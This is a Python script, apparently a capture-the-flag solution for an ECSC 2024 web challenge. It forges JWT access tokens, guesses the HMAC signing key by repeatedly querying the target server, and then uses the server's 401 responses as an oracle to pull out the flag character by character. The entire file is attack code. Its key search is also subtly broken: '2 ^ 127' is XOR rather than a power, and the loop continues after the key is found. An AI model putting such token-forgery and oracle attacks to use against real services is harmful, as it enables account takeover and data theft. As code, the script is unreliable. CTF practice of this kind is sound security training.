import requests
import jwt
import datetime
import string

payload = lambda username: {
  "fresh": False,
  "iat": 1719592823,
  "jti": "acac0127-2ff1-43d5-9028-7acf8090b54a",
  "type": "access",
  "sub": username,
  "exp": datetime.datetime.now() + datetime.timedelta(days=1)
}

base_url = 'https://nwaf.ecsc24.hack.cert.pl'

jwt_key = None

for x in range(2 ^ 127, 2 ^ 128):
    key = x.to_bytes(16, 'big')
    token = jwt.encode(payload("admin"), key, algorithm="HS256")

    res = requests.get(f'{base_url}/hello', cookies={'access_token_cookie': token})

    if res.status_code == 200:
        jwt_key = key
        print('key found', key)
        continue

def test_username(username):
    token = jwt.encode(payload(username), jwt_key, algorithm="HS256")
    res = requests.get(f'{base_url}/hello', cookies={'access_token_cookie': token})
    return res.status_code

alphabet = string.ascii_letters + string.digits + "_{}%$#@!"
flag = "ecsc24{"

while flag[-1] != '}':
    ngram = flag[-3:]
    print(ngram)
    for c in alphabet:
        username = ngram + c
        status = test_username(username)
        if status == 401:
            flag += c
            break
            
    print(flag)
